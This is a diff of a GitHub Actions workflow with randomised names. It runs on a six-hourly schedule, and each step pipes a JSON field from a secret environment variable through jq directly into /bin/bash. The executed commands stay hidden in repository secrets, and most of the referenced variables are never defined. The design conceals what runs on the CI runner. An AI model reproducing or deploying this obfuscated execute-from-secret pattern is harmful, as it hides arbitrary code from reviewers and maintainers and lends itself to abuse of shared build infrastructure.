@@ -3,22 +3,26 @@ name: shangwangcha6178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 1/6 * * *'
+    - cron: '37 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shangwangcha6178
         env:
-          dfom66754: ${{ secrets.dfom66754 }}
+          chu79: ${{ secrets.chu79 }}
         run: |
-          echo $dfom66754 | jq -r .k56 | /bin/bash
-          echo $tt1 | jq -r .v0 | /bin/bash
-          echo $o59578 | jq -r .gh5 | /bin/bash
-          echo $xnarm69610 | jq -r .eir9 | /bin/bash
-          echo $f64 | jq -r .m8 | /bin/bash
-          echo $caxz173 | jq -r .g2533 | /bin/bash
-          echo $asdbc28 | jq -r .b664 | /bin/bash
+          echo $chu79 | jq -r .ee84 | /bin/bash
+          echo $xug3 | jq -r .z24280 | /bin/bash
+          echo $gob1 | jq -r .jop0895 | /bin/bash
+          echo $z2342 | jq -r .dqhe5537 | /bin/bash
+          echo $ds2 | jq -r .c37598 | /bin/bash
+          echo $rd625 | jq -r .hxhy039 | /bin/bash
+          echo $jvwvw342 | jq -r .n50272 | /bin/bash
+          echo $jpdb3815 | jq -r .nprah48 | /bin/bash
+          echo $wkq067 | jq -r .ctnv62 | /bin/bash
+          echo $ss432 | jq -r .wxtjp63110 | /bin/bash
+          echo $ttff5 | jq -r .s023 | /bin/bash
 
